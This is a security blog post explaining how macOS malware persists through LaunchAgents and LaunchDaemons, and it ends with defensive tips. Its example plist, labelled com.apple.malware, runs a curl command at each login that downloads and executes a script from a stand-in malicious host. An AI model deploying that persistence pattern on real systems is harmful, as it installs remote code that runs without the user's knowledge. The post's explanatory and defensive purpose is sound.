---
layout: post
title: "Malware Persistence Mechanisms: Exploring LaunchAgents and LaunchDaemons on macOS"
date: 2023-04-17 18:30:00 +0300
categories: security
---
Launch daemons and agents are the officially recommended method by Apple for maintaining the persistence of non-application binaries, such as software updaters, antivirus products, and more. Unfortunately, both launch daemons and launch agents are often exploited by macOS malware to achieve persistence. Launch daemons are non-interactive and run before user login, while launch agents run after the user has logged in and may be interactive. To create a persistent launched daemon or agent, one simply needs to create the binary and then place a configuration property list in one of the launch daemon or agent directories.

## Malware Persistence via LaunchAgents

One of the most prevalent methods for malware persistence on macOS involves the use of `LaunchAgents`. Each user on a Mac can have a dedicated `LaunchAgents` folder within their `Library` folder, which allows code to run every time that specific user logs in. Furthermore, there is a computer-level `LaunchAgents` folder that can execute code for all users upon login. Although there is a `LaunchAgents` folder for the system's own usage, macOS now manages it (since version 10.11), preventing malware from accessing this location by default, as long as System Integrity Protection remains enabled and uncompromised.

`LaunchAgents` are represented by property list files, which can either specify a file to execute or contain the commands to be executed directly. In Apple terminology, property lists (or 'plists') are XML files used by macOS to store serialized objects. For launch daemons and agents, there is a plist for each daemon or agent that contains the required configuration information. As part of the OS initialization process, these files are processed, and they can include key-value pairs that instruct the OS to automatically start the daemon or agent.

User `LaunchAgents` are the most common form of persistence in the wild, primarily because they do not require privileges for installation. Regrettably, Apple made the controversial decision to hide the parent Library folder from users by default, starting with OSX 10.7 Lion, inadvertently making it easier for threat actors to conceal these agents from less tech-savvy users.

Here is an example of a LaunchAgent property list file:

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.malware</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl -O http://malware.com/malware.sh; sh malware.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
{% endhighlight %}

The example above demonstrates how a script from a remote server can be downloaded and executed each time the user logs in.

## Persistence through LaunchDaemons

While `LaunchDaemons` only exist at the computer and system levels, they are technically intended for persistent code that does not interact with the user, making them ideal for malware purposes. Writing a daemon to `/Library/LaunchDaemons` requires administrator-level privileges. Nonetheless, as most Mac users are also admin users and often grant authorization for software installation, this requirement is not a significant obstacle and is frequently bypassed by infections in the wild.

## Strengthening System Security

Overall, while launch daemons and agents provide a legitimate and convenient way for software to maintain persistence on macOS, their simplicity and ease of use also make them vulnerable to exploitation by malware. Users and administrators should remain vigilant and monitor the contents of launch daemon and agent directories to detect any suspicious or unauthorized activity.

To further protect your system, consider adopting the following security practices:

1. Regularly update your operating system and applications to ensure you have the latest security patches.
2. Install a reputable antivirus solution and keep it up to date.
3. Be cautious when downloading software or opening email attachments, especially from unknown sources.
4. Limit user account privileges, using administrator accounts only when necessary.
5. Implement strong and unique passwords for all user accounts.
6. Enable macOS's built-in security features, such as FileVault for disk encryption and the built-in firewall.
7. Regularly back up your data to protect against data loss in case of a malware attack.

By understanding how malware leverages `LaunchAgents` and `LaunchDaemons` for persistence and implementing robust security measures, you can significantly reduce the risk of infection and protect your macOS system from threats in the wild.